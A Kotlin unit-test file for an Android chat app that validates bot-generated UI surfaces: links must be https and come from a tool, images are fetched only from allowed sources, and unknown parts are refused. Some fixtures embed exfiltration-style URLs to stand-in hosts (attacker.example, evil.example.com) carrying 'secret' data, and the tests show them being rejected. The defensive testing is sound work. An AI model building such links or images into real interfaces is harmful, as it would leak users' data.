package dev.gbot.app.local

import kotlinx.serialization.json.Json
import kotlinx.serialization.json.JsonObject
import kotlinx.serialization.json.jsonArray
import kotlinx.serialization.json.jsonObject
import kotlinx.serialization.json.jsonPrimitive
import org.junit.Assert.assertEquals
import org.junit.Assert.assertFalse
import org.junit.Assert.assertNotNull
import org.junit.Assert.assertTrue
import org.junit.Assert.fail
import org.junit.Test

/** What a show_ui surface may carry before the chat draws it. */
class SurfacesTest {
    private fun args(s: String): JsonObject = Json.parseToJsonElement(s).jsonObject

    private fun rejected(s: String, keep: (String) -> String? = { null }): String = try {
        Surfaces.build(args(s), keep = keep)
        fail("expected a rejection for $s"); ""
    } catch (e: Surfaces.Rejected) { e.reason }

    private fun parts(sf: Surfaces.Surface) = sf.spec["components"]!!.jsonArray.map { it.jsonObject }
    private fun part(sf: Surfaces.Surface, id: String) = parts(sf).first { it["id"]!!.jsonPrimitive.content == id }

    private val form = """{"title":"Book a table","data":{"name":"","size":"2"},"components":[
        {"id":"root","component":"Column","children":["h","name","size","go"]},
        {"id":"h","component":"Text","text":"Where shall I book?","variant":"h3"},
        {"id":"name","component":"TextField","label":"Name","value":{"path":"/name"}},
        {"id":"size","component":"ChoicePicker","label":"People","options":[{"label":"2","value":"2"},{"label":"4","value":"4"}],"value":{"path":"/size"},"variant":"mutuallyExclusive"},
        {"id":"gl","component":"Text","text":"Book"},
        {"id":"go","component":"Button","child":"gl","variant":"primary","action":{"event":{"name":"book","context":{"name":{"path":"/name"}}}}}]}"""

    @Test
    fun aFormWithAnEventButtonWaitsForThePerson() {
        val sf = Surfaces.build(args(form)) { null }
        assertEquals("Book a table", sf.title)
        assertTrue(sf.interactive)
        assertEquals(6, parts(sf).size)
        assertEquals("", sf.spec["data"]!!.jsonObject["name"]!!.jsonPrimitive.content)
    }

    @Test
    fun theGlanceExampleTheModelCopiesIsAValidCard() {
        val sf = Surfaces.build(args(GLANCE_EXAMPLE)) { null }
        assertEquals("Weather", sf.title)
        assertFalse(sf.interactive)
        assertEquals("Card", part(sf, "root")["component"]!!.jsonPrimitive.content)
        assertEquals("14°C, light rain", part(sf, "now")["text"]!!.jsonPrimitive.content)
    }

    @Test
    fun aLinkButtonIsShownWithoutWaiting() {
        val sf = Surfaces.build(args("""{"components":[
            {"id":"root","component":"Button","child":"l","action":{"functionCall":{"call":"openUrl","args":{"url":"https://example.com/a"}}}},
            {"id":"l","component":"Text","text":"Open"}]}""")) { null }
        assertFalse(sf.interactive)
    }

    @Test
    fun onlyHttpsLinksOpen() {
        assertTrue(rejected("""{"components":[{"id":"root","component":"Button","child":"l","action":{"functionCall":{"call":"openUrl","args":{"url":"intent://x#Intent;end"}}}},{"id":"l","component":"Text","text":"x"}]}""").contains("https"))
        // A link built from data could carry what the bot read; it must be written out.
        assertTrue(rejected("""{"components":[{"id":"root","component":"Button","child":"l","action":{"functionCall":{"call":"openUrl","args":{"url":{"path":"/u"}}}}},{"id":"l","component":"Text","text":"x"}]}""").contains("https"))
    }

    @Test
    fun aLinkMustBeOneAToolGaveOrThePersonWrote() {
        val s = """{"components":[{"id":"root","component":"Button","child":"l","variant":"primary","action":{"functionCall":{"call":"openUrl","args":{"url":"https://attacker.example/?d=secret"}}}},{"id":"l","component":"Text","text":"Confirm"}]}"""
        val r = try { Surfaces.build(args(s), allowLink = { it.startsWith("https://hotel.example/") }) { null }; "" } catch (e: Surfaces.Rejected) { e.reason }
        assertTrue(r, r.contains("no tool gave"))
        Surfaces.build(args(s.replace("https://attacker.example/?d=secret", "https://hotel.example/book")), allowLink = { it.startsWith("https://hotel.example/") }) { null }
    }

    @Test
    fun nothingIsFetchedForASurfaceThatFails() {
        var fetched = 0
        rejected("""{"data":"not an object","components":[{"id":"root","component":"Image","url":"https://cdn.example.com/a.jpg"}]}""") { fetched++; "/x" }
        rejected("""{"components":[{"id":"root","component":"Column","children":["i","b"]},{"id":"i","component":"Image","url":"https://cdn.example.com/a.jpg"},{"id":"b","component":"Button","child":"i"}]}""") { fetched++; "/x" }
        assertEquals(0, fetched)
    }

    @Test
    fun picturesAreFetchedSideBySide() {
        val urls = (1..6).joinToString(",") { """{"id":"i$it","component":"Image","url":"https://cdn.example.com/$it.jpg"}""" }
        val kids = (1..6).joinToString(",") { "\"i$it\"" }
        val started = System.nanoTime()
        val sf = Surfaces.build(args("""{"components":[{"id":"root","component":"Column","children":[$kids]},$urls]}""")) { Thread.sleep(400); "/kept/" + it.substringAfterLast('/') }
        val ms = (System.nanoTime() - started) / 1_000_000
        assertEquals(6, Surfaces.files(sf.spec).size)
        assertTrue("took $ms ms", ms < 2000)
    }

    @Test
    fun aLinkCanOnlyOpenFromATap() {
        // A function in a value runs as the part is drawn.
        val r = rejected("""{"components":[{"id":"root","component":"Text","text":{"call":"openUrl","args":{"url":"https://e.com"}}}]}""")
        assertTrue(r, r.contains("openUrl"))
        val c = rejected("""{"components":[{"id":"root","component":"Button","child":"l","action":{"event":{"name":"x","context":{"a":{"call":"openUrl","args":{"url":"https://e.com"}}}}}},{"id":"l","component":"Text","text":"x"}]}""")
        assertTrue(c, c.contains("openUrl"))
        // The plain ones are fine.
        Surfaces.build(args("""{"components":[{"id":"root","component":"Text","text":{"call":"formatString","args":{"value":"Hi"}}}]}""")) { null }
    }

    @Test
    fun unknownPartsAndPropertiesAreRefusedOrDropped() {
        assertTrue(rejected("""{"components":[{"id":"root","component":"Video","url":"https://e.com/v.mp4"}]}""").contains("Video"))
        val sf = Surfaces.build(args("""{"components":[{"id":"root","component":"Text","text":"hi","onClick":"x","style":{"color":"red"}}]}""")) { null }
        assertEquals(setOf("id", "component", "text"), part(sf, "root").keys)
    }

    @Test
    fun theTreeMustBeWhole() {
        assertTrue(rejected("""{"components":[{"id":"a","component":"Text","text":"x"}]}""").contains("root"))
        assertTrue(rejected("""{"components":[{"id":"root","component":"Column","children":["nope"]}]}""").contains("nope"))
        assertTrue(rejected("""{"components":[{"id":"root","component":"Card","child":"b"},{"id":"b","component":"Card","child":"root"}]}""").contains("itself"))
        assertTrue(rejected("""{"components":[{"id":"root","component":"Text","text":"x"},{"id":"root","component":"Text","text":"y"}]}""").contains("Two"))
        // Parts nothing reaches are dropped.
        val sf = Surfaces.build(args("""{"components":[{"id":"root","component":"Text","text":"x"},{"id":"stray","component":"Text","text":"y"}]}""")) { null }
        assertEquals(1, parts(sf).size)
    }

    @Test
    fun aPictureIsKeptOnThePhoneAndNamedByItsFile() {
        val asked = mutableListOf<String>()
        val sf = Surfaces.build(args("""{"components":[
            {"id":"root","component":"Column","children":["a","b"]},
            {"id":"a","component":"Image","url":"https://cdn.example.com/a.jpg"},
            {"id":"b","component":"Image","url":"https://evil.example.com/?q=secret"}]}""")) { url ->
            asked.add(url); if (url.startsWith("https://cdn.")) "/data/pictures/res_1.jpg" else null
        }
        assertEquals(2, asked.size)
        assertEquals(Surfaces.FILE_SCHEME + "/data/pictures/res_1.jpg", part(sf, "a")["url"]!!.jsonPrimitive.content)
        // The other was not one a tool gave: it isn't drawn at all.
        assertEquals("Column", part(sf, "b")["component"]!!.jsonPrimitive.content)
        assertEquals(1, sf.dropped)
        assertEquals(setOf("/data/pictures/res_1.jpg"), Surfaces.files(sf.spec))
    }

    @Test
    fun aPictureFromDataIsRefused() {
        assertTrue(rejected("""{"data":{"u":"https://e.com/a.jpg"},"components":[{"id":"root","component":"Image","url":{"path":"/u"}}]}""").contains("https"))
        val sf = Surfaces.build(args("""{"components":[{"id":"root","component":"Image","url":"http://e.com/a.jpg"}]}""")) { "/x" }
        assertEquals(1, sf.dropped)
    }

    @Test
    fun longTextIsClipped() {
        val long = "x".repeat(2000)
        val sf = Surfaces.build(args("""{"components":[{"id":"root","component":"Text","text":"$long"}]}""")) { null }
        assertEquals(Surfaces.MAX_TEXT, part(sf, "root")["text"]!!.jsonPrimitive.content.length)
    }

    @Test
    fun componentsAndDataSentAsTextStillWork() {
        val inner = """[{"id":"root","component":"Text","text":{"path":"/t"}}]"""
        val sf = Surfaces.build(kotlinx.serialization.json.buildJsonObject {
            put("components", kotlinx.serialization.json.JsonPrimitive(inner))
            put("data", kotlinx.serialization.json.JsonPrimitive("""{"t":"hello"}"""))
        }) { null }
        assertEquals("hello", sf.spec["data"]!!.jsonObject["t"]!!.jsonPrimitive.content)
    }

    @Test
    fun itemsBecomeCards() {
        val set = LocalResults(java.io.File(System.getProperty("java.io.tmpdir"), "gbot-surfaces-test")).build(args("""{"title":"Hotels","items":[
            {"title":"Echo Hotel","subtitle":"The Mall","link":"https://e.com/x","fields":[{"label":"Rating","value":"9.6"}]},
            {"title":"Longitude"}]}"""))!!
        val spec = Surfaces.fromItems(set.items.map { it.jsonObject })
        val all = spec["components"]!!.jsonArray.map { it.jsonObject }
        val root = all.first { it["id"]!!.jsonPrimitive.content == "root" }
        assertEquals(listOf("c0", "c1"), root["children"]!!.jsonArray.map { it.jsonPrimitive.content })
        val open = all.first { it["id"]!!.jsonPrimitive.content == "o0" }
        assertEquals("https://e.com/x", open["action"]!!.jsonObject["functionCall"]!!.jsonObject["args"]!!.jsonObject["url"]!!.jsonPrimitive.content)
        // The cards pass the same checks as any surface.
        assertNotNull(Surfaces.build(kotlinx.serialization.json.buildJsonObject { put("components", spec["components"]!!) }) { null })
    }

    @Test
    fun theBotReadsBackWhatThePersonDid() {
        assertEquals("The person tapped \"book\" with {\"name\":\"Ana\"}.", Surfaces.answerLine("""{"event":"book","context":{"name":"Ana"}}"""))
        assertTrue(Surfaces.answerLine(null).contains("without choosing"))
    }

    @Test
    fun messagesAreA2uiV09() {
        val sf = Surfaces.build(args(form)) { null }
        val msgs = Surfaces.messages("m1", sf.spec).map { Json.parseToJsonElement(it).jsonObject }
        assertEquals(listOf("createSurface", "updateComponents", "updateDataModel"), msgs.map { (it.keys - "version").single() })
        assertTrue(msgs.all { it["version"]!!.jsonPrimitive.content == "v0.9" })
        assertEquals(Surfaces.CATALOG_ID, msgs[0]["createSurface"]!!.jsonObject["catalogId"]!!.jsonPrimitive.content)
    }
}
